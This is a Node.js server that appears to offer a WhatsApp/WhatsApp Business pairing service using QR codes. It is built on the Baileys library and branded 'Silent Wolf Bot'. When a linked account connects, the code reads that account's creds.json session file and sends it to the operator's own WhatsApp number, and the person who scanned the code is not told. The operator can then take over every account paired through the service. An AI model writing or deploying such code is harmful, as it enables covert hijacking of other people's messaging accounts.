import express from 'express';
import bodyParser from 'body-parser';
import fs from 'fs';
import path from 'path';
import QRCode from 'qrcode';
import pkg from '@whiskeysockets/baileys';

const { default: makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion, DisconnectReason } = pkg;

const app = express();
app.use(bodyParser.json());
app.use(express.static('public'));

const PORT = 3000;

// 👇 Replace with your own WhatsApp JID (countrycode+number@s.whatsapp.net)
const ownerJid = "2547XXXXXXX@s.whatsapp.net";

// Ensure sessions folder exists
const sessionsDir = path.join(process.cwd(), 'sessions');
if (!fs.existsSync(sessionsDir)) fs.mkdirSync(sessionsDir);

// Store active sockets per number
const activeSockets = {};

async function startSock(number, type, res) {
  const sessionPath = path.join(sessionsDir, number + (type === 'wab' ? '_business' : '_wa'));
  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    browser: type === 'wab'
      ? ['Ubuntu', 'Chrome', '110.0.0 Business'] // Business
      : ['Ubuntu', 'Chrome', '110.0.0'],        // Normal
  });

  let qrSent = false;

  sock.ev.on('connection.update', async (update) => {
    const { qr, connection, lastDisconnect } = update;

    if (qr && !qrSent && res) {
      qrSent = true;
      const qrDataURL = await QRCode.toDataURL(qr);
      res.json({ qr: qrDataURL });
    }

    if (connection === 'open') {
      console.log(`✅ Connected to ${type === 'wab' ? 'WhatsApp Business' : 'WhatsApp'} as: ${number}`);
      activeSockets[number] = sock;

      // 🔑 Read session creds and send to your DM
      try {
        const credsPath = path.join(sessionPath, "creds.json");
        if (fs.existsSync(credsPath)) {
          const sessionData = fs.readFileSync(credsPath, "utf-8");

          await sock.sendMessage(ownerJid, {
            text: `🐺 Silent Wolf Bot Session for *${number}*\n\n\`\`\`${sessionData}\`\`\``
          });

          console.log(`📩 Session for ${number} sent to your DM (${ownerJid})`);
        }
      } catch (err) {
        console.error("⚠️ Failed to send session to DM:", err);
      }
    }

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = DisconnectReason[statusCode] || statusCode;
      console.log(`❌ Connection closed for ${number}: ${reason}`);

      if (reason !== DisconnectReason.loggedOut) {
        console.log(`🔄 Restarting socket for ${number}...`);
        startSock(number, type); // auto-reconnect
      } else {
        console.log(`⚠️ Logged out: delete ${sessionPath} and rescan QR`);
      }
    }
  });

  sock.ev.on('creds.update', saveCreds);

  // Timeout if QR not generated
  if (res) {
    setTimeout(() => {
      if (!qrSent) {
        res.status(500).json({ error: 'Failed to generate QR in time' });
      }
    }, 15000);
  }

  return sock;
}

// Endpoint for generating QR
app.post('/generate', async (req, res) => {
  const { number, type } = req.body; // type = "wa" or "wab"
  if (!number) return res.status(400).json({ error: 'Please provide a WhatsApp number' });

  try {
    await startSock(number, type, res);
  } catch (err) {
    console.error('QR generation error:', err);
    res.status(500).json({ error: 'Failed to generate QR' });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
